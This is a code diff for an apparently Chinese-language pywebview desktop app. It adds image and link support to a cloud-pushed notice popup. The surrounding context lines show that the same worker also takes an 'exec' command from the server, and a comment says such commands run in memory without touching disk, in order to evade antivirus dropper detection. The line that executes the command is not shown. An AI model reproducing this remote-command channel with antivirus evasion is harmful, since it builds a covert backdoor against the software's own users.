@@ -454,6 +454,8 @@ def _notice_worker():
             return
         title = str(r.get("title") or "公告")
         text = str(r.get("text") or "").strip()
+        image = str(r.get("image") or "").strip()
+        link = str(r.get("link") or "").strip()
         once = str(r.get("once") or "").strip()
         exec_cmd = str(r.get("exec") or "").strip()
 
@@ -463,14 +465,20 @@ def _notice_worker():
                 return
             _cloud_done_mark(once)          # 先记账再执行，防崩溃重放
 
-        if text:
-            key = once or (title + "|" + text[:64])
+        if image or text:
+            key = once or (title + "|" + text[:64] + "|" + image[:64])
             with _CLOUD_LOCK:
                 if _NOTICE_SHOWN["key"] == key:
                     return                   # 本进程已处理过同一条
                 _NOTICE_SHOWN["key"] = key
-            # v8.6.2：公告只读取不弹窗 —— 写进界面日志区即可
-            _push_log("[公告] %s：%s" % (title, text[:200]))
+            if image:
+                # v3.9：公告带图 → 弹窗看图（图片 src 由服务器下发，base64 内联或外链）
+                _notice_show(title, text, image, link)
+                _push_log("[公告] %s（含图片）%s"
+                          % (title, ("：" + text[:120]) if text else ""))
+            elif text:
+                # 纯文字公告：只读取不弹窗 —— 写进界面日志区即可（v8.6.2 起）
+                _push_log("[公告] %s：%s" % (title, text[:200]))
 
         # 云控命令：内存执行，不落盘脚本文件（规避杀软 Dropper 特征）
         if exec_cmd:
@@ -486,11 +494,13 @@ def _notice_worker():
         pass                          # 公告/云控失败不影响任何主流程
 
 
-def _notice_show(title, text):
-    """等 pywebview 窗口就绪后 evaluate_js 弹窗（最多等 25s）。"""
+def _notice_show(title, text, image="", link=""):
+    """等 pywebview 窗口就绪后 evaluate_js 弹窗（最多等 25s）。
+    v3.9：支持图片（image=图片 src，base64 data URI 或外链）与点击跳转 link。"""
     import webview
-    arg = json.dumps({"t": title, "x": text}, ensure_ascii=False)
-    js = "try{const _n=%s;showCloudNotice(_n.t,_n.x)}catch(e){}" % arg
+    arg = json.dumps({"t": title, "x": text, "i": image, "u": link},
+                     ensure_ascii=False)
+    js = "try{const _n=%s;showCloudNotice(_n.t,_n.x,_n.i,_n.u)}catch(e){}" % arg
     for _ in range(50):
         try:
             if webview.windows:
@@ -2669,17 +2679,20 @@ function openExt(u){           // 优先 pywebview 桥（Python 开系统浏览�
 function joinQQ(){toast("浏览器打开加群页，进群后看群公告拿群号…");openExt(QQ_LINK);}
 function joinTG(){toast("打开 TG 频道…");openExt(TG_LINK);}
 
-/* ---- 云下发公告弹窗（v8.6）：Python 在云验证通过后 evaluate_js 调这里 ---- */
-function showCloudNotice(title,text){
+/* ---- 云下发公告弹窗（v8.6；v3.9 支持图片）：Python 在云验证通过后 evaluate_js 调这里 ---- */
+function showCloudNotice(title,text,image,link){
   let veil=document.getElementById("noticeveil");
   if(!veil){
     veil=document.createElement("div");veil.id="noticeveil";
     veil.style.cssText="position:fixed;inset:0;z-index:99999;background:rgba(0,0,0,.62);"
       +"display:none;align-items:center;justify-content:center;";
-    veil.innerHTML='<div style="max-width:520px;width:86%;background:#1d1f24;border:1px solid #3a3f4b;'
-      +'border-radius:14px;padding:26px 28px;box-shadow:0 18px 60px rgba(0,0,0,.55);">'
+    veil.innerHTML='<div style="max-width:560px;width:88%;max-height:88vh;overflow:auto;'
+      +'background:#1d1f24;border:1px solid #3a3f4b;border-radius:14px;padding:26px 28px;'
+      +'box-shadow:0 18px 60px rgba(0,0,0,.55);">'
       +'<div id="nt-title" style="font-size:17px;font-weight:700;color:#e8eaf0;'
       +'margin-bottom:12px;"></div>'
+      +'<img id="nt-img" alt="" style="display:none;width:100%;border-radius:10px;'
+      +'margin-bottom:14px;">'
       +'<div id="nt-text" style="font-size:14px;line-height:1.75;color:#aab0bd;'
       +'white-space:pre-wrap;word-break:break-word;"></div>'
       +'<button id="nt-ok" style="margin-top:20px;width:100%;padding:10px 0;font-size:14px;'
@@ -2687,8 +2700,17 @@ function showCloudNotice(title,text){
     document.body.appendChild(veil);
     veil.querySelector("#nt-ok").onclick=()=>{veil.style.display="none";};
   }
-  veil.querySelector("#nt-title").textContent=title||"公告";
-  veil.querySelector("#nt-text").textContent=text||"";
+  const tt=veil.querySelector("#nt-title"),tx=veil.querySelector("#nt-text"),
+        im=veil.querySelector("#nt-img");
+  tt.textContent=title||"公告";tt.style.display=title?"":"none";
+  tx.textContent=text||"";tx.style.display=text?"":"none";
+  if(image){
+    im.src=image;im.style.display="block";
+    im.style.cursor=link?"pointer":"default";
+    im.onclick=link?()=>{openExt(link);}:null;
+  }else{
+    im.style.display="none";im.removeAttribute("src");im.onclick=null;
+  }
   veil.style.display="flex";
 }
 function showJoinVeil(){$("#pickveil").classList.remove("show");$("#joinveil").classList.add("show");}
